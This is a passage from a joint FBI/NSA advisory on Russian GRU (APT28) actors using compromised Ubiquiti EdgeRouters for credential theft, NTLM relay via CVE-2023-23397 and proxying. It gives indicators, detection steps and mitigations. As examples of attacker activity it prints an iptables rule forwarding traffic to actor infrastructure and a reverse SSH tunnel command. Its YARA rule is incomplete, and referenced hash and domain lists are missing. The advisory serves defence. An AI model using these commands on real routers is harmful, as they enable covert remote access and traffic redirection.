Russian Cyber  Actors  Use Compromise d Routers to 
Facilitate Cyber Operations  
SUMMARY  
The Federal Bureau of Investigation (FBI) , 
National Security Agency (NSA) , US Cyber 
Command,  and international partners  are releasing 
this joint Cybersecurity Advisory (CSA) to warn of 
Russian state -sponsored cyber actors’  use of 
compromis ed Ubiquiti  EdgeRouters (EdgeRouters)  
to facilitate malicious cyber operations  worldwide . 
The FBI, NSA, US Cyber C ommand , and 
international partners  – including authorities from 
Belgium, Brazil, France, Germany , Latvia, 
Lithuania, Norway, Poland , South Korea, and the 
United Kingdom -- assess the Russian General Staff Main Intelligence Directorate (GRU) , 85th Main 
Spec ial Service Center (GTsSS) , also known as APT28, Fancy Bear, and Forest Blizzard (Strontium) , 
have used compromised EdgeRouters  globally  to harvest credentials, collect NTLMv2 digests, proxy 
network  traffic, and host spear -phishing  landing pages  and custom tools . 
The U.S. Department of Justice, including the FBI, and international partners recently disrupt ed a 
GRU botnet consisting of such routers. However, owners of relevant devices should take the  remedial 
actions described below to ensure the long -term success of the disruption effort and to identify and 
remediate any similar compromises.  Actions EdgeRouter network defenders and 
users should implement to protect against 
APT28 activity : 
• Perform a hardware factory reset.  
• Upgrade to the latest firmware version.  
• Change any default usernames and 
passwords.  
• Implement strategic firewall rules on 
WAN -side interfaces .

TLP: CLEAR    TECHNICAL DETAI LS 
Note:  This advisory uses the MITRE ATT&CK® for Enterprise  framework, version 14. See the MITRE 
ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE 
ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE 
ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping  
and CISA’s Decider Tool . 
Overview  
This advisory provides observed tactics, techniques, and procedures (TTPs), indicators  of 
compromise (IOCs), and recommendations to mitigate t he threat  posed by APT28 threat actors 
related to compromised EdgeRouters . Given the global popularity of EdgeRouters, the FBI and its 
international partners  urge EdgeRouter  network defenders and users to apply immediately the 
recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of 
cybersecurity incidents associated with APT28 activity.  
Ubiquiti EdgeRouters have a user -friendly, Linux -based operating system that makes them popular  
for both consumers and malicious cyber actors. EdgeRouters are often shipped with default 
credentials and limited  to no firewall protections to accommodate wireless internet service providers  
(WISPs) . Additional ly, EdgeRouters do not automatically update firmware unless a consumer 
configures them to do so . 
Threat Actor Activity   
As early as  2022 , APT28  actors had utilized compromised EdgeRouters  to facilitate covert cyber  
operations  against governments , militaries, and organizations  around  the worl d. These operati ons 
have targeted various industries,  including  Aerospace & Defense, Education, Energy & Utilities, 
Governments, Hospitality, Manufacturing, Oil & Gas, Retail, Technology, and Transportation. 
Targeted countries  include Czech Republic, Italy, Lithuan ia, Jordan, Montenegro, Poland , Slovakia, 
Turkey, Ukraine, United Arab Emirates, and the US [1][2] . Additionally, the actors have strategically 
targeted many individuals  in Ukraine.  
An FBI investigatio n revealed  APT28  actors accessed EdgeRouters compromised by Moobot , a 
botnet that installs OpenSSH trojans on compromised hardware [T1588 ]. While the compromise of 
EdgeRouters has been  documented in open -source reporting , FBI investigation revealed e ach 
compromised router accessed by  APT28  actors housed a  collection of Bash scripts and ELF binaries 
designed to exploit  backd oor OpenSSH daemons and related services [ T1546 ] for a variety of 
purposes . 
APT28 actors have used compromised EdgeRouters to collect credentials, proxy network traffic, and 
host spoofed landing pages and custom post -exploitation tools.  For example , in early 2023, APT28  
actors authored custom Python script s to collect account credentials for specifically targeted  webmail 
users . APT28 actors uploaded these  custom Python script s [T1587 ] to a subset of compromised 
Ubiquiti routers to validate stolen webmail account credentials collected via cross -site scripting and 
browser -in-the-browser spear -phishing campaigns  [T1566 ].  
 
  TLP: CLEAR  
 
Page 3 of 8  |  Product ID : JCSA -20240227 -001 
TLP: CLEAR    Additionally, an FBI investigation revealed that  as early as 2022 , APT28  actors had exploited CVE -
2023 -23397, a zero -day vulnerability at the time , to collect NTLMv2 digests f rom targeted Outlook 
accounts  [T1203 ]. Per a Microsoft blog post [3] published in March 2023, CVE -2023 -23397 is a critical 
elevation of privilege vulnerability in Microsoft Outlook on Windows wherein Net -NTLMv2 hashes are 
leaked to actor -controlled infrastructure  [T1119 , T1020 ]. Despite Microsoft releasing a patch for the 
vulnerability, FBI investigation revealed APT28 actors have continued to exploit CVE -2023 -23397 to 
leak NTLM dig ests to actor controlled infrastructure. APT28  actors  have installed publicly availab le 
tools  such as  Impacket ntlmrelayx.py [4] and Responder [5] on compromised Ubiquiti routers to 
execute NTLM relay attacks  [T1557 ] and host NTLMv2 rogue authentication servers  [T1556 ].  
In summary, w ith root access to compromised Ubiquiti EdgeRouter s, APT28  actors  have unfettered  
access  to Linux -based operating systems  to install tooling and to obfuscate their identity while 
conducting malicious campaigns . 
Indicators of Comp romise  
The FBI  identified  IOCs  for the Moobot OpenSSH trojan and for APT28  activity  on EdgeRouters . 
Readers of this CSA can reference the observations  below to determine if their EdgeRouters have 
been impacted  by either party.  
Moobot OpenSSH Trojan  
APT28  actors have leveraged  default credentials and trojanized OpenSSH server processes to 
access EdgeRouters . Trojanized  OpenSSH server processes are associated with Moobot , a Mirai -
based botnet that infects internet of things (IoT) devices using remotely  exploitable vulnerabilit ies, 
such as  weak or default passwords . Trojanized  OpenSSH server binar ies downloaded from 
packinstall[.]kozow[.]com replace d legitimate binaries on EdgeRouters  accessed by APT28 , allowing 
remote attackers to bypass authentication.  
Credential Access via Python Script s  
APT28  actors have hosted custom Python scripts on compromised EdgeRouters  to collect and 
validate stolen webmail account credentials. The scripts are typically stored  alongside related log files  
in the home directory of a compromised user, e.g., /home/<compromised user>/srv/core.py  and 
/home/<compromised user>/srv/debug.txt . The FBI has recovered verbose log files with information 
about APT28  activity  on EdgeRouters . 
File name  SHA-256 
core.py 4E32B04930D1F745EBA92255EE1C5E5AC82B939FF12DE0522C8A4905431D033D  
core.py C51C6AA0230A2FEA888EBCD213D302F1CC9F6051FDB268AE5C7A09415845C404  
Network defen ders can use the FBI-created Yara rule below to  locate credential collection scripts on 
compromised EdgeRouters . Additionally, they can query network traffic for connections with  API 
endpoint  api[.]anti -captcha[.]com , which APT28  actors use in their custom Python scripts to 
automatically break captcha problem s on webmail login pages.  
rule APT28_core_scripts  { 
strings:  
   $a = "make_response('BAD')"  
   $b = "make_response('Finaly')"

$e = "messages/remove"  
$f = "acbb64c3de5ea5e5936df4a1eecf1235"  
condition:  
5 of them 
} 
Exploitation of CVE-2023 -23397  
APT28  actors have used ntlmrelayx.py  and Responder to facilitate NTMLv2 credential leaks via 
exploitation of CVE -2023 -23397 as a zero -day vulnerability since early 2022. The FBI collected 
evidence of APT28  CVE-2023 -23397  activity on numerous compromised EdgeRouters.  With default 
configurations, Responder logs activity to the following files: 
- Responder -Session.log, and  
- Responder.db.  
Network defenders and users can search EdgeRouters  for tooling associated with ntlmrelayx.py  
and Responder to identify APT28  activity.  
Proxy and Tunnel  Infrastructure  
APT28  actors have used iptables rules on EdgeRouters to  establish  reverse proxy connections to 
dedicated infrastructure. Readers of this CSA can review iptables chains and  Bash histories on 
EdgeRouters for unusual invocations like the example provided below.   
iptables -t nat -I PREROUTING -d <router IP address> -p tcp -m tcp --dport 4443 -
j DNAT -to-destination <APT28 dedicated infrastructure>:10081  
Additionally, APT28 actors have uploaded adversary -controlled SSH RSA keys to compromised 
EdgeRouters to establish reverse SSH tunnels and access compromised devices. Readers of this 
CSA can review /root/.ssh/ and other .ssh/ directories under /home/ for unknown RSA keys, which 
adversaries have used to access EdgeRouters despite password changes.  Readers can also query 
network traffic logs on EdgeRouters to identify abnormal SSH sessions. An invocation of a reverse 
SSH tunnel used by APT28  actors  is included below.  
ssh –i <RSA key> -p <port> root@<router IP address>  -R <router IP address>:<port>  
MASEPIE Malwar e 
In December 2023, APT28 actors wrote MASEPIE [6], a small Python backdoor capable of executing 
arbitrary commands on victim machines. An FBI investigation revealed that on more than one 
occasion, APT28 used compromised Ubiquiti EdgeRouters as command -and-control infrastructure for 
MASEPIE backdoors deployed against targets. Data sent to and from the EdgeRouters was 
encrypted using a randomly generated 16 -character AES key. It is important to note that APT28 does 
not deploy MASEPIE on EdgeRouters, but rathe r on systems belonging to targeted individuals and 
organizations.

DETECTION  
To locate related, malicious files on EdgeRouters, search Bash histories of all users for file downloads 
from domain packinstall [.]kozow[.]com , query network traffic for connections with domain 
packinstall [.]kozow[.]com , and reference the file hash table below to locate artifacts on disk. 
Additionally, if directory /usr/lib/libu.a/  exists on an EdgeRouter, it is likely an infection occurred.

Some versions of the  OpenSSH trojan  create malicious users systemd  and systemx  in /etc/shadow  
and /etc/passw d on infected EdgeRouters. The trojan also introduces an OpenDNS server IP 
address in /etc/resolv.conf , 208[.]67[.]220[.]222 , and a user -land process named .kworker  
to masquerade as a legitimate kernel thread.  
Network defenders can also query network traffic for connections with the following domains, which  
were identified by the FBI and  are associated with the OpenSSH trojan . HTTP beacons to these 
domains follow the form provided after the list.

MITIGATION S 
Rebooting a compromised EdgeRouter will not remove the existing malware of concern , if present . 
The FBI and its partners  recommend the following steps be taken  to remediate  compromised 
EdgeRouters:  
1. Perform a hardware factory reset  to flush file systems of malicious files , 
2. Upgrade to the latest firmware version , 
3. Change any default usernames and password s, and 
4. Implement strategic firewall rules  on WAN -side interfaces  to prevent the unwanted exposure 
of remote management services . 
Additionally, all network  owners should keep their operating systems, software, and firmware up to 
date. Timely patching is one of the most efficient and cost -effective steps an organization can take to 
minimize its exposure to  cybersecurity threats.  For CVE -2023 -23397, updating Microsoft Outlook 
mitigates the vulnerability. To mitigate other forms of NTLM relay, all network owners should consider 
disabling NTLM when feasible, or enabling server signing and Extended Protection f or Authentication 
configurations [7]. 
 
  TLP: CLEAR  
 
Page 8 of 8  |  Product ID : JCSA -20240227 -001 
TLP: CLEAR    Further, for longer term mitigations, network owners should prioritize only using routers and other 
equipment incorporating  secure -by-design principles that eliminate default passwords and SOHO 
router defects.  
REPORTING  
The FBI seeks any information or evidence of APT28  activity on compromised  EdgeR outers. This 
information provides the FBI with the critical information it need s to deter continued use of such 
techniques and to hold threat actors accountable under  United States law.  
The FBI encourages organizations and individuals to report information concerning suspicious or 
criminal activity to their local FBI field office , or the FBI’s Internet Crime Complaint Center (IC3) . 
When available, each report submitted should include the date, time, location, type of activity, number 
of people, and type of equipment used for the activity, the name of the submitting compan y or 
organization, and a designated point of contact.
